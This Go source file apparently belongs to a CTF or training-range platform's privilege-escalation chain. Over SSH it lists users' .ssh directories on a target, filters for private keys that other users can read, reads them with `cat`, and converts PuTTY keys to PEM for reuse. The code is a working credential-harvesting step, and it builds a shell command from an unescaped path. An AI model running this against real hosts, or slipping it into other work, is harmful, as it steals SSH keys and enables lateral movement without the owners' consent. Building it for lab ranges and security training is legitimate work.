package ctfplatform

// keyscan.go —— 自动发现"世界可读的 SSH 私钥"，去掉对具体用户名的硬编码。
//
// 动机：killchain 原先写死 /home/achen/.ssh/achen_priv.ppk，换个靶机就不成立。
// 真实靶场的共性是"私钥权限没设对"，与用户名无关，所以应该**扫出来**而不是猜。
//
// 与 flag 判分无关：仅实验靶场提权链使用。

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"
)

// SSHKeyRef 是一个可读的私钥文件。
type SSHKeyRef struct {
	Path  string // 绝对路径
	Owner string // 归属用户（从 /home/<user>/ 推断）
	Perm  string // 权限串，如 -rw-rw-r--
}

// reLSKeyLine 匹配 `ls -l` 的私钥行：权限 + 属主 + 大小 + 路径。
// 只认"其他用户可读"（末三位含 r）且文件名像私钥的条目。
var reLSKeyLine = regexp.MustCompile(`^([-][rwx-]{9})\s+\d+\s+(\S+)\s+(\S+)\s+(\d+)\s+.*\s(/\S+)$`)

// looksLikePrivateKey 判断文件名是否像私钥。
func looksLikePrivateKey(path string) bool {
	base := path
	if i := strings.LastIndexByte(path, '/'); i >= 0 {
		base = path[i+1:]
	}
	lower := strings.ToLower(base)
	// 排除公钥与已知非私钥
	if strings.HasSuffix(lower, ".pub") || strings.HasSuffix(lower, "_pub.ppk") ||
		strings.HasSuffix(lower, "authorized_keys") || strings.HasSuffix(lower, "known_hosts") {
		return false
	}
	switch {
	case strings.HasSuffix(lower, ".ppk"),
		strings.HasSuffix(lower, ".key"),
		strings.HasSuffix(lower, ".pem"),
		lower == "id_rsa", lower == "id_dsa", lower == "id_ecdsa", lower == "id_ed25519":
		return true
	}
	return strings.Contains(lower, "priv") || strings.Contains(lower, "id_rsa")
}

// parseReadableKeys 从 `ls -l` 输出里筛出"其他用户可读的私钥"。纯函数，便于单测。
func parseReadableKeys(lsOutput string) []SSHKeyRef {
	var out []SSHKeyRef
	seen := map[string]bool{}
	for _, line := range strings.Split(lsOutput, "\n") {
		line = strings.TrimRight(line, "\r")
		m := reLSKeyLine.FindStringSubmatch(strings.TrimSpace(line))
		if m == nil {
			continue
		}
		perm, owner, path := m[1], m[2], m[5]
		// 末三位（其他用户）必须可读；且不能是仅属主可读
		other := perm[7:10]
		if !strings.Contains(other, "r") {
			continue
		}
		if !looksLikePrivateKey(path) {
			continue
		}
		if seen[path] {
			continue
		}
		seen[path] = true
		// 从 /home/<user>/... 推断归属用户
		user := owner
		if strings.HasPrefix(path, "/home/") {
			rest := strings.TrimPrefix(path, "/home/")
			if i := strings.IndexByte(rest, '/'); i > 0 {
				user = rest[:i]
			}
		}
		out = append(out, SSHKeyRef{Path: path, Owner: user, Perm: perm})
	}
	return out
}

// FindReadableSSHKeys 在靶机上扫描各用户 .ssh 目录，返回可读私钥列表。
// 只看 /home/* 与当前用户 ~，不做全盘 find（慢且噪音大）。
func FindReadableSSHKeys(ctx context.Context, addr, user, password string,
	allowInsecure bool, timeout time.Duration) ([]SSHKeyRef, error) {

	// 2>/dev/null 抑制无权限目录的噪音；-d 保证目录不存在时不报错
	cmd := `ls -l /home/*/.ssh/* ~/.ssh/* 2>/dev/null`
	out, err := RunSSHCommand(ctx, addr, user, password, cmd, allowInsecure, timeout)
	if err != nil && out == "" {
		return nil, fmt.Errorf("扫描私钥失败: %w", err)
	}
	keys := parseReadableKeys(out)
	if len(keys) == 0 {
		return nil, fmt.Errorf("未发现其他用户可读的私钥")
	}
	return keys, nil
}

// LoadKeyMaterial 读取私钥文件内容并转成 x/crypto/ssh 可用的 PEM。
// .ppk 走 PPKToPEM；其余原样返回（假定已是 OpenSSH/PEM）。
func LoadKeyMaterial(ctx context.Context, addr, user, password, keyPath string,
	allowInsecure bool, timeout time.Duration) ([]byte, error) {

	out, err := RunSSHCommand(ctx, addr, user, password, "cat "+keyPath+" 2>&1", allowInsecure, timeout)
	if err != nil && out == "" {
		return nil, fmt.Errorf("读取私钥 %s 失败: %w", keyPath, err)
	}
	raw := []byte(out)
	if strings.Contains(out, "PuTTY-User-Key-File-2") {
		pemBytes, err := PPKToPEM(raw)
		if err != nil {
			return nil, fmt.Errorf("PPK 转换失败: %w", err)
		}
		return pemBytes, nil
	}
	if strings.Contains(out, "PRIVATE KEY") {
		return raw, nil
	}
	return nil, fmt.Errorf("无法识别的私钥格式（%s）", keyPath)
}
